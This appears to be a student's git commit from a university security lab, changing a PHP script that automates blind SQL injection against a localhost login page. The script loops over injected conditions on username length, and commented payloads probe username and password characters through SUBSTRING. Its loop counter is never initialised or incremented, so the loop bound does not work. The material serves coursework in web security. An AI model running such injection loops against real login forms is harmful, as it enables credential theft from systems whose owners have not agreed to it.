8fbe1d0238846d9bbe94432c488f0e25afbe8b79
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 13:33:12 +0200

    test

--- script.php
+++ script.php
@@ -3,14 +3,21 @@
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
 //$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"
 
-$i = 5;
-
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
-/*$counter = 0;
+$i = 0;
 while ($counter < 25)
 {
-    
-}*/
+    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
+	$result = file_get_contents($url);
+	if (strpos($result, 'cat') !== false) {
+	echo "\n";
+	echo 'true';
+	}else{
+		echo "\n";
+		echo "nope";
+	}
+
+	$i++;
+}
 
 
 
